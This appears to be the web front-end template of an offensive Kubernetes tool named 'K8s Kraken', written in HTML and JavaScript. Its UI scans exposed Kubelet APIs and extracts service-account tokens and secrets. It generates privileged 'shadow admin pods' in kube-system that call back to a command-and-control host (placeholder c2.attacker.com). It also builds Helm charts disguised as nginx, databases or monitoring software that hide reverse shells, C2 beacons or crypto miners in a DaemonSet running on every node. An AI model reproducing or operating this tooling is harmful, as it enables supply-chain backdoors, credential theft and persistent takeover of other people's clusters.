{% extends "base.html" %}
{% block title %}K8s Kraken - Kubernetes Warfare{% endblock %}
{% block content %}
<div class="container-fluid py-4">
    <!-- Header -->
    <div class="row mb-4">
        <div class="col-12">
            <div class="card bg-dark border-info">
                <div class="card-body text-center py-4">
                    <h1 class="display-4 text-info">
                        <i class="bi bi-layers-fill me-3"></i>K8s Kraken
                    </h1>
                    <p class="lead text-light mb-0">Container & Orchestration Warfare</p>
                    <small class="text-muted">Kubernetes Cluster Domination â€¢ Helm Backdoor â€¢ DaemonSet Persistence</small>
                </div>
            </div>
        </div>
    </div>

    <!-- Status Bar -->
    <div class="row mb-4">
        <div class="col-md-3">
            <div class="card bg-dark border-success text-center">
                <div class="card-body">
                    <h5 class="text-success mb-0"><i class="bi bi-activity"></i> Module Active</h5>
                    <small class="text-muted" id="moduleStatus">Checking...</small>
                </div>
            </div>
        </div>
        <div class="col-md-3">
            <div class="card bg-dark border-warning text-center">
                <div class="card-body">
                    <h5 class="text-warning mb-0"><i class="bi bi-hdd-network"></i> Kubelet Port</h5>
                    <small class="text-light">TCP 10250</small>
                </div>
            </div>
        </div>
        <div class="col-md-3">
            <div class="card bg-dark border-danger text-center">
                <div class="card-body">
                    <h5 class="text-danger mb-0"><i class="bi bi-database-fill"></i> ETCD</h5>
                    <small class="text-light">TCP 2379</small>
                </div>
            </div>
        </div>
        <div class="col-md-3">
            <div class="card bg-dark border-primary text-center">
                <div class="card-body">
                    <h5 class="text-primary mb-0"><i class="bi bi-box-seam-fill"></i> Helm Charts</h5>
                    <small class="text-light" id="chartCount">8 Templates</small>
                </div>
            </div>
        </div>
    </div>

    <!-- Main Tabs -->
    <ul class="nav nav-tabs nav-fill mb-4" role="tablist">
        <li class="nav-item">
            <a class="nav-link active text-warning" data-bs-toggle="tab" href="#kubelet">
                <i class="bi bi-unlock-fill me-2"></i>Kubelet Exploiter
            </a>
        </li>
        <li class="nav-item">
            <a class="nav-link text-info" data-bs-toggle="tab" href="#helm">
                <i class="bi bi-file-earmark-zip-fill me-2"></i>Helm Backdoor Generator
            </a>
        </li>
        <li class="nav-item">
            <a class="nav-link text-success" data-bs-toggle="tab" href="#playbook">
                <i class="bi bi-book-fill me-2"></i>Attack Playbook
            </a>
        </li>
    </ul>

    <div class="tab-content">
        <!-- KUBELET EXPLOITER TAB -->
        <div class="tab-pane fade show active" id="kubelet">
            <div class="row">
                <!-- Scan Form -->
                <div class="col-md-5">
                    <div class="card bg-dark border-warning mb-4">
                        <div class="card-header bg-warning text-dark">
                            <h5 class="mb-0"><i class="bi bi-radar me-2"></i>Kubelet API Scanner</h5>
                        </div>
                        <div class="card-body">
                            <form id="kubeletScanForm">
                                <div class="mb-3">
                                    <label class="form-label text-light">Target IP(s)</label>
                                    <input type="text" class="form-control bg-dark text-light" id="kubeletTarget" 
                                           placeholder="10.0.0.1 or 10.0.0.1,10.0.0.2,10.0.0.3">
                                    <small class="text-muted">Single IP or comma-separated list</small>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label text-light">Port</label>
                                    <input type="number" class="form-control bg-dark text-light" id="kubeletPort" value="10250">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label text-light">Timeout (sec)</label>
                                    <input type="number" class="form-control bg-dark text-light" id="kubeletTimeout" value="10">
                                </div>
                                <button type="submit" class="btn btn-warning w-100">
                                    <i class="bi bi-search me-2"></i>Scan Kubelet API
                                </button>
                            </form>
                        </div>
                    </div>

                    <!-- Shadow Pod Generator -->
                    <div class="card bg-dark border-danger mb-4">
                        <div class="card-header bg-danger text-white">
                            <h5 class="mb-0"><i class="bi bi-incognito me-2"></i>Shadow Admin Pod</h5>
                        </div>
                        <div class="card-body">
                            <form id="shadowPodForm">
                                <div class="mb-3">
                                    <label class="form-label text-light">Pod Name</label>
                                    <input type="text" class="form-control bg-dark text-light" id="shadowPodName" 
                                           value="metrics-helper" placeholder="coredns-helper">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label text-light">Namespace</label>
                                    <input type="text" class="form-control bg-dark text-light" id="shadowNamespace" 
                                           value="kube-system">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label text-light">Callback URL</label>
                                    <input type="text" class="form-control bg-dark text-light" id="shadowCallback" 
                                           placeholder="http://c2.attacker.com:4444">
                                </div>
                                <div class="mb-3">
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="checkbox" id="shadowPrivileged" checked>
                                        <label class="form-check-label text-light">Privileged</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="checkbox" id="shadowHostNetwork" checked>
                                        <label class="form-check-label text-light">hostNetwork</label>
                                    </div>
                                    <div class="form-check form-check-inline">
                                        <input class="form-check-input" type="checkbox" id="shadowHostPid" checked>
                                        <label class="form-check-label text-light">hostPID</label>
                                    </div>
                                </div>
                                <button type="submit" class="btn btn-danger w-100">
                                    <i class="bi bi-download me-2"></i>Generate Shadow Pod YAML
                                </button>
                            </form>
                        </div>
                    </div>
                </div>

                <!-- Scan Results -->
                <div class="col-md-7">
                    <div class="card bg-dark border-secondary h-100">
                        <div class="card-header bg-secondary text-white d-flex justify-content-between">
                            <h5 class="mb-0"><i class="bi bi-terminal me-2"></i>Scan Results</h5>
                            <button class="btn btn-sm btn-outline-light" onclick="clearKubeletResults()">Clear</button>
                        </div>
                        <div class="card-body" style="max-height: 600px; overflow-y: auto;">
                            <div id="kubeletResults">
                                <div class="text-center text-muted py-5">
                                    <i class="bi bi-layers display-1"></i>
                                    <p class="mt-3">Enter target IP and scan for exposed Kubelet APIs</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- HELM BACKDOOR TAB -->
        <div class="tab-pane fade" id="helm">
            <div class="row">
                <!-- Chart Generator Form -->
                <div class="col-md-5">
                    <div class="card bg-dark border-info mb-4">
                        <div class="card-header bg-info text-dark">
                            <h5 class="mb-0"><i class="bi bi-file-earmark-code-fill me-2"></i>Backdoor Chart Generator</h5>
                        </div>
                        <div class="card-body">
                            <form id="helmGenerateForm">
                                <div class="mb-3">
                                    <label class="form-label text-light">Chart Type (Disguise)</label>
                                    <select class="form-select bg-dark text-light" id="helmChartType">
                                        <option value="postgresql">PostgreSQL - Database</option>
                                        <option value="mysql">MySQL - Database</option>
                                        <option value="redis">Redis - Cache</option>
                                        <option value="mongodb">MongoDB - NoSQL</option>
                                        <option value="nginx" selected>Nginx - Web Server</option>
                                        <option value="prometheus">Prometheus - Monitoring</option>
                                        <option value="grafana">Grafana - Dashboards</option>
                                        <option value="elasticsearch">Elasticsearch - Search</option>
                                    </select>
                                    <small class="text-muted">DevOps will think they're installing this</small>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label text-light">Payload Type</label>
                                    <select class="form-select bg-dark text-light" id="helmPayloadType">
                                        <option value="reverse_shell">Reverse Shell</option>
                                        <option value="beacon" selected>Beacon (C2)</option>
                                        <option value="miner">Crypto Miner</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label text-light">Callback URL</label>
                                    <input type="text" class="form-control bg-dark text-light" id="helmCallback" 
                                           placeholder="http://c2.attacker.com:4444">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label text-light">Chart Version</label>
                                    <input type="text" class="form-control bg-dark text-light" id="helmVersion" 
                                           value="1.0.0">
                                </div>
                                <div class="mb-3">
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="helmDaemonset" checked>
                                        <label class="form-check-label text-light">
                                            Include DaemonSet <span class="badge bg-danger ms-1">Runs on ALL nodes</span>
                                        </label>
                                    </div>
                                </div>
                                <div class="d-grid gap-2">
                                    <button type="submit" class="btn btn-info">
                                        <i class="bi bi-file-earmark-code me-2"></i>Generate Chart
                                    </button>
                                    <button type="button" class="btn btn-success" id="helmDownloadBtn" disabled>
                                        <i class="bi bi-download me-2"></i>Download as ZIP
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>

                    <!-- Chart Info -->
                    <div class="card bg-dark border-warning">
                        <div class="card-header bg-warning text-dark">
                            <h5 class="mb-0"><i class="bi bi-info-circle me-2"></i>How It Works</h5>
                        </div>
                        <div class="card-body">
                            <ol class="text-light">
                                <li>Generate chart disguised as legit software</li>
                                <li>Hidden DaemonSet named <code>metrics-collector</code></li>
                                <li>Payload encoded in <code>telemetry</code> ConfigMap</li>
                                <li>DevOps runs: <code>helm install mydb ./chart</code></li>
                                <li>Your agent deploys to <strong>EVERY</strong> node ðŸŽ¯</li>
                            </ol>
                            <div class="alert alert-danger mb-0">
                                <i class="bi bi-exclamation-triangle-fill me-2"></i>
                                <strong>Persistence:</strong> DaemonSet respawns automatically!
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Generated Chart Preview -->
                <div class="col-md-7">
                    <div class="card bg-dark border-secondary h-100">
                        <div class="card-header bg-secondary text-white">
                            <h5 class="mb-0"><i class="bi bi-file-earmark-text me-2"></i>Generated Chart Preview</h5>
                        </div>
                        <div class="card-body">
                            <div id="helmResults">
                                <div class="text-center text-muted py-5">
                                    <i class="bi bi-box-seam display-1"></i>
                                    <p class="mt-3">Configure options and generate a backdoored Helm chart</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- ATTACK PLAYBOOK TAB -->
        <div class="tab-pane fade" id="playbook">
            <div class="card bg-dark border-success">
                <div class="card-header bg-success text-white">
                    <h5 class="mb-0"><i class="bi bi-book-fill me-2"></i>Kubernetes Cluster Takeover Playbook</h5>
                </div>
                <div class="card-body" id="playbookContent">
                    <div class="text-center py-3">
                        <div class="spinner-border text-success"></div>
                        <p class="mt-2">Loading playbook...</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Shadow Pod YAML Modal -->
<div class="modal fade" id="shadowPodModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
        <div class="modal-content bg-dark text-light">
            <div class="modal-header border-danger">
                <h5 class="modal-title text-danger">
                    <i class="bi bi-incognito me-2"></i>Shadow Admin Pod YAML
                </h5>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body">
                <pre id="shadowPodYaml" class="bg-black text-success p-3 rounded" 
                     style="max-height: 400px; overflow-y: auto;"></pre>
                <div class="mt-3">
                    <strong>Deploy Command:</strong>
                    <code class="text-warning">kubectl apply -f shadow-pod.yaml</code>
                </div>
            </div>
            <div class="modal-footer border-secondary">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-danger" onclick="copyShadowPod()">
                    <i class="bi bi-clipboard me-2"></i>Copy YAML
                </button>
                <button type="button" class="btn btn-warning" onclick="downloadShadowPod()">
                    <i class="bi bi-download me-2"></i>Download
                </button>
            </div>
        </div>
    </div>
</div>

<style>
.nav-tabs .nav-link {
    color: #6c757d;
    border: 1px solid transparent;
}
.nav-tabs .nav-link:hover {
    border-color: #495057;
}
.nav-tabs .nav-link.active {
    background-color: #1a1a2e;
    border-color: #495057;
}
.result-card {
    background: #1a1a2e;
    border-radius: 8px;
    padding: 15px;
    margin-bottom: 10px;
}
.exploitable {
    border-left: 4px solid #28a745;
}
.not-exploitable {
    border-left: 4px solid #dc3545;
}
.file-tree {
    font-family: 'Courier New', monospace;
}
.file-tree-item {
    cursor: pointer;
    padding: 5px 10px;
    border-radius: 4px;
}
.file-tree-item:hover {
    background: #2a2a4e;
}
.playbook-phase {
    background: #1a1a2e;
    border-radius: 8px;
    padding: 20px;
    margin-bottom: 15px;
}
</style>

<script>
let currentHelmChart = null;

document.addEventListener('DOMContentLoaded', function() {
    checkModuleStatus();
    loadPlaybook();
});

// Check module status
async function checkModuleStatus() {
    try {
        const response = await fetch('/k8s-kraken/api/status');
        const data = await response.json();
        
        document.getElementById('moduleStatus').textContent = 
            data.available ? 'v' + data.version : 'Not Available';
        document.getElementById('chartCount').textContent = 
            data.supported_charts?.length + ' Templates' || '8 Templates';
    } catch (error) {
        document.getElementById('moduleStatus').textContent = 'Error';
    }
}

// Kubelet Scan
document.getElementById('kubeletScanForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const targetInput = document.getElementById('kubeletTarget').value;
    const port = parseInt(document.getElementById('kubeletPort').value);
    const timeout = parseInt(document.getElementById('kubeletTimeout').value);
    
    const resultsDiv = document.getElementById('kubeletResults');
    resultsDiv.innerHTML = '<div class="text-center py-4"><div class="spinner-border text-warning"></div><p class="mt-2">Scanning...</p></div>';
    
    // Check if multiple targets
    const targets = targetInput.split(',').map(t => t.trim()).filter(t => t);
    
    try {
        let response;
        if (targets.length > 1) {
            response = await fetch('/k8s-kraken/api/scan-range', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ targets, port })
            });
        } else {
            response = await fetch('/k8s-kraken/api/kubelet/scan', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ target: targets[0], port, timeout })
            });
        }
        
        const data = await response.json();
        
        if (targets.length > 1) {
            displayMultiScanResults(data);
        } else {
            displaySingleScanResult(data);
        }
    } catch (error) {
        resultsDiv.innerHTML = `<div class="alert alert-danger">${error.message}</div>`;
    }
});

function displaySingleScanResult(data) {
    const resultsDiv = document.getElementById('kubeletResults');
    
    if (!data.success) {
        resultsDiv.innerHTML = `<div class="alert alert-danger">${data.error}</div>`;
        return;
    }
    
    const result = data.result;
    const isExploitable = result.exploitable;
    
    let html = `
        <div class="result-card ${isExploitable ? 'exploitable' : 'not-exploitable'}">
            <div class="d-flex justify-content-between align-items-center mb-3">
                <h5 class="mb-0">${result.target}:${result.port}</h5>
                <span class="badge ${isExploitable ? 'bg-success' : 'bg-danger'}">
                    ${isExploitable ? 'âœ“ EXPLOITABLE' : 'âœ— Not Exploitable'}
                </span>
            </div>
            
            <table class="table table-dark table-sm">
                <tr><td>Auth Status</td><td><code>${result.auth_status}</code></td></tr>
                <tr><td>K8s Version</td><td>${result.version || 'Unknown'}</td></tr>
                <tr><td>Pods Count</td><td>${result.pods_count}</td></tr>
                <tr><td>Namespaces</td><td>${result.namespaces?.join(', ') || 'N/A'}</td></tr>
                <tr><td>Secrets Accessible</td><td>${result.secrets_accessible ? '<span class="text-success">YES</span>' : 'No'}</td></tr>
            </table>
    `;
    
    if (isExploitable) {
        html += `
            <div class="mt-3">
                <button class="btn btn-sm btn-warning me-2" onclick="listPods('${result.target}', ${result.port})">
                    <i class="bi bi-list-ul me-1"></i>List Pods
                </button>
                <button class="btn btn-sm btn-danger me-2" onclick="extractSecrets('${result.target}', ${result.port})">
                    <i class="bi bi-key me-1"></i>Extract Secrets
                </button>
            </div>
        `;
    }
    
    html += '</div>';
    resultsDiv.innerHTML = html;
}

function displayMultiScanResults(data) {
    const resultsDiv = document.getElementById('kubeletResults');
    
    if (!data.success) {
        resultsDiv.innerHTML = `<div class="alert alert-danger">${data.error}</div>`;
        return;
    }
    
    let html = `
        <div class="alert alert-info">
            <strong>Scan Summary:</strong> ${data.summary.exploitable}/${data.summary.total_scanned} exploitable
        </div>
    `;
    
    data.results.forEach(result => {
        html += `
            <div class="result-card ${result.exploitable ? 'exploitable' : 'not-exploitable'}">
                <div class="d-flex justify-content-between align-items-center">
                    <span><code>${result.target}:${result.port}</code></span>
                    <span class="badge ${result.exploitable ? 'bg-success' : 'bg-secondary'}">
                        ${result.auth_status}
                    </span>
                </div>
            </div>
        `;
    });
    
    resultsDiv.innerHTML = html;
}

async function listPods(target, port) {
    const resultsDiv = document.getElementById('kubeletResults');
    resultsDiv.innerHTML += '<div class="text-center py-3"><div class="spinner-border spinner-border-sm text-warning"></div> Listing pods...</div>';
    
    try {
        const response = await fetch('/k8s-kraken/api/kubelet/pods', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ target, port })
        });
        const data = await response.json();
        
        if (data.success) {
            let html = `
                <div class="result-card mt-3">
                    <h5 class="text-warning mb-3"><i class="bi bi-box-seam me-2"></i>Pods (${data.summary.total})</h5>
                    <table class="table table-dark table-sm">
                        <thead>
                            <tr><th>Namespace</th><th>Pod</th><th>Status</th><th>Flags</th></tr>
                        </thead>
                        <tbody>
            `;
            data.pods.slice(0, 20).forEach(pod => {
                let flags = [];
                if (pod.privileged) flags.push('<span class="badge bg-danger">Priv</span>');
                if (pod.host_network) flags.push('<span class="badge bg-warning">HostNet</span>');
                
                html += `
                    <tr>
                        <td>${pod.namespace}</td>
                        <td><code>${pod.name}</code></td>
                        <td>${pod.status || 'Running'}</td>
                        <td>${flags.join(' ') || '-'}</td>
                    </tr>
                `;
            });
            html += '</tbody></table></div>';
            resultsDiv.innerHTML += html;
        }
    } catch (error) {
        console.error(error);
    }
}

async function extractSecrets(target, port) {
    const resultsDiv = document.getElementById('kubeletResults');
    resultsDiv.innerHTML += '<div class="text-center py-3"><div class="spinner-border spinner-border-sm text-danger"></div> Extracting secrets...</div>';
    
    try {
        const response = await fetch('/k8s-kraken/api/kubelet/secrets', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ target, port })
        });
        const data = await response.json();
        
        if (data.success) {
            let html = `
                <div class="result-card mt-3">
                    <h5 class="text-danger mb-3"><i class="bi bi-key-fill me-2"></i>Secrets Found (${data.summary.total})</h5>
                    <div class="alert alert-success">
                        SA Tokens: ${data.summary.service_account_tokens} | Env Vars: ${data.summary.env_variables}
                    </div>
                    <div style="max-height: 300px; overflow-y: auto;">
            `;
            data.secrets.slice(0, 10).forEach(secret => {
                html += `
                    <div class="bg-black p-2 rounded mb-2">
                        <small class="text-muted">${secret.pod} / ${secret.type}</small><br>
                        <code class="text-success">${secret.value?.substring(0, 100)}...</code>
                    </div>
                `;
            });
            html += '</div></div>';
            resultsDiv.innerHTML += html;
        }
    } catch (error) {
        console.error(error);
    }
}

function clearKubeletResults() {
    document.getElementById('kubeletResults').innerHTML = `
        <div class="text-center text-muted py-5">
            <i class="bi bi-layers display-1"></i>
            <p class="mt-3">Enter target IP and scan for exposed Kubelet APIs</p>
        </div>
    `;
}

// Shadow Pod Generator
document.getElementById('shadowPodForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    try {
        const response = await fetch('/k8s-kraken/api/kubelet/shadow-pod', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                name: document.getElementById('shadowPodName').value,
                namespace: document.getElementById('shadowNamespace').value,
                callback_url: document.getElementById('shadowCallback').value,
                privileged: document.getElementById('shadowPrivileged').checked,
                host_network: document.getElementById('shadowHostNetwork').checked,
                host_pid: document.getElementById('shadowHostPid').checked
            })
        });
        
        const data = await response.json();
        
        if (data.success) {
            document.getElementById('shadowPodYaml').textContent = data.yaml;
            new bootstrap.Modal(document.getElementById('shadowPodModal')).show();
        }
    } catch (error) {
        alert('Error: ' + error.message);
    }
});

function copyShadowPod() {
    const yaml = document.getElementById('shadowPodYaml').textContent;
    navigator.clipboard.writeText(yaml);
    alert('YAML copied to clipboard!');
}

function downloadShadowPod() {
    const yaml = document.getElementById('shadowPodYaml').textContent;
    const blob = new Blob([yaml], { type: 'text/yaml' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'shadow-pod.yaml';
    a.click();
}

// Helm Backdoor Generator
document.getElementById('helmGenerateForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const resultsDiv = document.getElementById('helmResults');
    resultsDiv.innerHTML = '<div class="text-center py-4"><div class="spinner-border text-info"></div><p class="mt-2">Generating chart...</p></div>';
    
    try {
        const response = await fetch('/k8s-kraken/api/helm/generate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chart_type: document.getElementById('helmChartType').value,
                payload_type: document.getElementById('helmPayloadType').value,
                callback_url: document.getElementById('helmCallback').value,
                version: document.getElementById('helmVersion').value,
                include_daemonset: document.getElementById('helmDaemonset').checked
            })
        });
        
        const data = await response.json();
        
        if (data.success) {
            currentHelmChart = data.chart;
            displayHelmChart(data);
            document.getElementById('helmDownloadBtn').disabled = false;
        } else {
            resultsDiv.innerHTML = `<div class="alert alert-danger">${data.error}</div>`;
        }
    } catch (error) {
        resultsDiv.innerHTML = `<div class="alert alert-danger">${error.message}</div>`;
    }
});

function displayHelmChart(data) {
    const chart = data.chart;
    const files = Object.keys(chart.files);
    
    let html = `
        <div class="mb-3">
            <div class="d-flex justify-content-between">
                <div>
                    <h5 class="text-info mb-1">${chart.name}</h5>
                    <small class="text-muted">${chart.description}</small>
                </div>
                <span class="badge bg-info">v${chart.version}</span>
            </div>
        </div>
        
        <div class="alert alert-warning py-2">
            <strong>Install:</strong> <code>${data.install_command}</code>
        </div>
        
        <div class="row">
            <div class="col-md-4">
                <h6 class="text-light">Chart Files</h6>
                <div class="file-tree">
    `;
    
    files.forEach(file => {
        const icon = file.endsWith('.yaml') ? 'file-earmark-code' : 'file-earmark-text';
        html += `
            <div class="file-tree-item text-light" onclick="previewHelmFile('${file}')">
                <i class="bi bi-${icon} me-2"></i>${file}
            </div>
        `;
    });
    
    html += `
                </div>
            </div>
            <div class="col-md-8">
                <h6 class="text-light">File Preview</h6>
                <pre id="helmFilePreview" class="bg-black text-success p-3 rounded" 
                     style="max-height: 350px; overflow-y: auto; font-size: 12px;">Click a file to preview</pre>
            </div>
        </div>
    `;
    
    document.getElementById('helmResults').innerHTML = html;
}

function previewHelmFile(filename) {
    if (currentHelmChart && currentHelmChart.files[filename]) {
        document.getElementById('helmFilePreview').textContent = currentHelmChart.files[filename];
    }
}

// Download Helm Chart
document.getElementById('helmDownloadBtn').addEventListener('click', async function() {
    if (!currentHelmChart) return;
    
    try {
        const response = await fetch('/k8s-kraken/api/helm/download', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chart_type: document.getElementById('helmChartType').value,
                payload_type: document.getElementById('helmPayloadType').value,
                callback_url: document.getElementById('helmCallback').value,
                version: document.getElementById('helmVersion').value,
                include_daemonset: document.getElementById('helmDaemonset').checked
            })
        });
        
        const blob = await response.blob();
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = currentHelmChart.name + '-chart.zip';
        a.click();
    } catch (error) {
        alert('Download error: ' + error.message);
    }
});

// Load Attack Playbook
async function loadPlaybook() {
    try {
        const response = await fetch('/k8s-kraken/api/attack-playbook');
        const data = await response.json();
        
        if (data.success) {
            displayPlaybook(data.playbook);
        }
    } catch (error) {
        document.getElementById('playbookContent').innerHTML = 
            '<div class="alert alert-danger">Failed to load playbook</div>';
    }
}

function displayPlaybook(playbook) {
    let html = `<h4 class="text-success mb-4">${playbook.title}</h4>`;
    
    playbook.phases.forEach(phase => {
        html += `
            <div class="playbook-phase">
                <div class="d-flex align-items-center mb-3">
                    <span class="badge bg-success rounded-circle me-3" style="width: 30px; height: 30px; line-height: 22px;">
                        ${phase.phase}
                    </span>
                    <h5 class="text-light mb-0">${phase.name}</h5>
                </div>
                <ul class="text-light mb-0">
        `;
        phase.steps.forEach(step => {
            html += `<li>${step}</li>`;
        });
        html += '</ul></div>';
    });
    
    html += `
        <div class="playbook-phase border-warning" style="border: 1px solid var(--bs-warning);">
            <h5 class="text-warning mb-3"><i class="bi bi-bullseye me-2"></i>Key Targets</h5>
            <ul class="text-light mb-0">
    `;
    playbook.key_targets.forEach(target => {
        html += `<li>${target}</li>`;
    });
    html += '</ul></div>';
    
    document.getElementById('playbookContent').innerHTML = html;
}
</script>
{% endblock %}
